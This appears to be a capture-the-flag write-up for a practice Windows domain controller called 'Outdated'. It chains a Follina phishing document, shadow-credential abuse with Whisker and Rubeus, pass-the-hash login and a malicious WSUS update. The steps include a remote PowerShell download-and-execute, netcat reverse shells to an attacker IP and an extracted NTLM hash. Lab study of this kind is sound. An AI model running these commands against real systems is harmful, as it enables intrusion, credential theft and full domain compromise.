# Outdated

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 10.10.11.175           
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 11:12 EST
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.27% done; ETC: 11:13 (0:00:00 remaining)
Nmap scan report for 10.10.11.175
Host is up (0.070s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-08 00:12:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-12-08T00:01:24
|_Not valid after:  2026-12-08T00:01:24
|_ssl-date: 2025-12-08T00:13:48+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-08T00:13:48+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-12-08T00:01:24
|_Not valid after:  2026-12-08T00:01:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-12-08T00:01:24
|_Not valid after:  2026-12-08T00:01:24
|_ssl-date: 2025-12-08T00:13:47+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-12-08T00:01:24
|_Not valid after:  2026-12-08T00:01:24
|_ssl-date: 2025-12-08T00:13:48+00:00; +8h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-08T00:13:11
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

We have access to the shares with SMB null session

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nxc smb dc.outdated.htb -u '.' -p '' --shares
SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.175    445    DC               [+] outdated.htb\.: (Guest)
SMB         10.10.11.175    445    DC               [*] Enumerated shares
SMB         10.10.11.175    445    DC               Share           Permissions     Remark
SMB         10.10.11.175    445    DC               -----           -----------     ------
SMB         10.10.11.175    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.175    445    DC               C$                              Default share
SMB         10.10.11.175    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.175    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.175    445    DC               Shares          READ            
SMB         10.10.11.175    445    DC               SYSVOL                          Logon server share 
SMB         10.10.11.175    445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.10.11.175    445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.10.11.175    445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ smbclient \\\\dc.outdated.htb\\Shares 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Mon Jun 20 11:01:33 2022
  ..                                  D        0  Mon Jun 20 11:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022

                9116415 blocks of size 4096. 1406206 blocks available
smb: \> get NOC_Reminder.pdf 
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (247.6 KiloBytes/sec) (average 247.6 KiloBytes/sec)
```

We fetch a file talking about CVE that need to be patched

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F43cKCmbIRyeWXZHWojbm%2Fimage.png?alt=media&#x26;token=b4f6da30-4f95-4686-99f6-74c43a0e30d1" alt=""><figcaption></figcaption></figure>

We try for the 1st one. The CVE lets us craft a docx file with an embedded payload, which further retreives a malicious html file that executes code. We see in the text an email address to which we should send a url. We can try to send them the malicious html file

```shellscript
# Generate the payload docx and html file
┌──(kali㉿kali)-[~/Downloads/CVE-2022-30190-Follina-exploit]
└─$ python3 follina.py -t docx -m command -c "IEX (iwr 'http://10.10.16.3:443/Invoke-PowerShellTcp.ps1')" -u 10.10.16.3
Generated 'clickme.docx' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://10.10.16.3:80/exploit.html

# Next modify exploit.html to index.html
┌──(kali㉿kali)-[~/Downloads/CVE-2022-30190-Follina-exploit/www]
└─$ mv exploit.html index.html
                                     
# Host the file                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads/CVE-2022-30190-Follina-exploit/www]
└─$ python3 -m http.server 80                                                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.175 - - [07/Dec/2025 12:38:16] "GET / HTTP/1.1" 200 -
```

Next we can send the mail with the url of our server.

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ sendEmail -t itsupport@outdated.htb -f from@attacker.com -s 10.10.11.175 -u "Important subject" -a /home/kali/Downloads/CVE-2022-30190-Follina-exploit/clickme.docx -m 'http://10.10.16.3:80/'    
Dec 07 12:37:56 kali sendEmail[8552]: Email was sent successfully!
```

We get a call on our webserver, which retrieves our reverse shell and we get a shell

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.175] 49859
Windows PowerShell running as user btables on CLIENT
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\btables\AppData\Local\Temp\SDIAG_c9c0eeaa-8789-4e4e-a1f1-fc54725f72a4>whoami
outdated\btables
```

We see some autologon credentials

```shellscript
PS C:\users\btables> tree /f 
Folder PATH listing
Volume serial number is 9EA0-5B4E
C:.
?   check_mail.ps1
?   
????3D Objects
????AutoLogon
?       Autologon.exe
?       Autologon64.exe
?       Autologon64a.exe
?       Eula.txt
```

```shellscript
PS C:\users\btables> cmdkey /list 

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02zjrfltqbartjde
    Local machine persistence
```

But nothing to do with it

Next we can run bloodhound and find out btables can Shadow credentials sflowers, who can psremote to the DC

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FDnWAEuuMaP6IJbQ3A08t%2Fimage.png?alt=media&#x26;token=799ec0e0-a27e-4bb1-b409-64ad7646196c" alt=""><figcaption></figcaption></figure>

```shellscript
PS C:\Users\btables> .\whisker.exe add /target:sflowers /domain:outdated.htb /dc:dc.outdated.htb /path:"cert.pfx" /password:Hacked@123
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 55e545a4-8b64-4da1-8916-d0b80947c8a7
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saving the associated certificate to file...
[*] The associated certificate was saved to cert.pfx
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"Hacked@123" /domain:outdated.htb /dc:dc.outdated.htb /getcredentials /show
```

Get the NTLM hash

```shellscript
PS C:\Users\btables> .\Rubeus.exe asktgt /user:sflowers /certificate:cert.pfx /password:"Hacked@123" /domain:outdated.htb /dc:dc.outdated.htb /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

We can test the creds

```shellscript
┌──(kali㉿kali)-[/mnt/…/Whisker-main/Whisker/bin/Release]
└─$ nxc winrm dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
WINRM       10.10.11.175    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:outdated.htb) 
WINRM       10.10.11.175    5985   DC               [+] outdated.htb\sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5 (Pwn3d!)
```

Now login with winrm

```shellscript
┌──(kali㉿kali)-[/mnt/…/Whisker-main/Whisker/bin/Release]
└─$ evil-winrm -i dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sflowers\Documents>
```

Also sflowers is part of WSUS admins. We can use SharpWSUS to inject a malicious update

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FRNuGtVYCscOFbGAbAVbn%2Fimage.png?alt=media&#x26;token=2d6738c1-5e77-4bea-8c07-cf1a8b6b3ef9" alt=""><figcaption></figcaption></figure>

We create the update

```shellscript
*Evil-WinRM* PS C:\USers\sflowers\Desktop> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\USers\sflowers\Desktop\nc.exe -e cmd.exe 10.10.16.3 9002" /title:"shell"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\sflowers\Desktop\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c C:\USers\sflowers\Desktop\nc.exe -e cmd.exe 10.10.16.3 9002
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c C:\USers\sflowers\Desktop\nc.exe -e cmd.exe 10.10.16.3 9002

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 34
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 35
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```

We approve the update as it is pending

```shellscript
*Evil-WinRM* PS C:\USers\sflowers\Desktop> .\SharpWSUS.exe approve /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:dc.outdated.htb

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: InjectGroup
Added Computer To Group
Approved Update

[*] Approve complete
```

We check if it was installed. It was not

```shellscript
*Evil-WinRM* PS C:\USers\sflowers\Desktop> .\SharpWSUS.exe check /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:dc.outdated.htb

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1

[*] Update is not installed

[*] Check complete
```

\
Waiting a bit it is finally installed and we get our shell

```shellscript
*Evil-WinRM* PS C:\USers\sflowers\Desktop> .\SharpWSUS.exe check /updateid:59209afb-ef34-4a27-acff-12480a3955fa /computername:dc.outdated.htb

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1

[*] Update is installed

[*] Check complete


┌──(kali㉿kali)-[/mnt/…/SharpWSUS-main/SharpWSUS/bin/Release]
└─$ rlwrap nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.175] 51189
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
